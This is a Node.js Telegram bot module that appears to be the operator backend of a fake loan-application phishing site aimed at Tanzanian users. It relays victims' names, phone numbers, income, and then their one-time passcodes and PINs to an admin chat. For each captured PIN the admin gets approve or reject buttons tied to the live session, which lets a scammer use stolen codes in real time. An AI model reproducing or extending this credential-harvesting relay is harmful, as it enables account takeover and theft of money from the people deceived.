const TelegramBot = require("node-telegram-bot-api");
const axios = require("axios");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID;
const SERVER_URL = process.env.RENDER_EXTERNAL_URL;

const bot = new TelegramBot(BOT_TOKEN, { polling: true });

// --- HELPERS ---
const escapeHTML = (str) => String(str || "N/A").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
const currency = (n) => `TZS ${Number(n || 0).toLocaleString()}`;

const send = (msg, options = {}) => {
    return bot.sendMessage(ADMIN_CHAT_ID, msg, { 
        parse_mode: "HTML", 
        ...options 
    }).catch(err => console.error("Telegram Send Error:", err.message));
};

// --- STEP-BY-STEP SENDERS ---

const sendStep1 = (d) => {
    return send(`💰 <b>STEP 1 – LOAN DETAILS</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n📋 <b>Type:</b> ${escapeHTML(d.loanType)}\n💵 <b>Amount:</b> ${currency(d.amount)}`);
};

const sendStep2 = (d) => {
    return send(`👤 <b>STEP 2 – PERSONAL INFO</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName)} ${escapeHTML(d.lastName)}\n📞 <b>Phone:</b> +255${d.phone}`);
};

const sendStep3 = (d) => {
    return send(`💼 <b>STEP 3 – EMPLOYMENT</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n💵 <b>Income:</b> ${currency(d.income)}\n💼 <b>Status:</b> ${escapeHTML(d.employment)}`);
};

const sendStep4 = (d) => {
    // This is the fix: It now shows as a submission
    return send(`🔢 <b>STEP 4 – OTP SUBMITTED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n🔢 <b>Entered OTP:</b> <code>${escapeHTML(d.otp)}</code>`);
};

const sendStep5 = (d) => {
    return send(`🔐 <b>STEP 5 – PIN SUBMITTED</b>\n━━━━━━━━━━━━━━━━━━━━\n🆔 <b>ID:</b> <code>${d.socketId}</code>\n👤 <b>Name:</b> ${escapeHTML(d.firstName || 'User')}\n🔑 <b>PIN:</b> <code>${escapeHTML(d.pin)}</code>`, {
        reply_markup: {
            inline_keyboard: [[
                { text: "✅ APPROVE", callback_data: `apr_${d.socketId}` },
                { text: "❌ REJECT", callback_data: `rej_${d.socketId}` }
            ]]
        }
    });
};

// --- CALLBACK ACTIONS ---
bot.on("callback_query", async (query) => {
    const [action, socketId] = query.data.split("_");
    const message = query.message;
    try {
        await axios.post(`${SERVER_URL}/admin/action`, { socketId, action: action === "apr" ? "approve" : "reject" });
        const statusText = action === "apr" ? "✅ APPROVED" : "❌ REJECTED";
        bot.editMessageText(`${message.text}\n\n${statusText} BY ADMIN`, {
            chat_id: ADMIN_CHAT_ID,
            message_id: message.message_id,
            parse_mode: "HTML"
        });
    } catch (err) { console.error("Callback Error:", err.message); }
});

module.exports = { sendStep1, sendStep2, sendStep3, sendStep4, sendStep5 };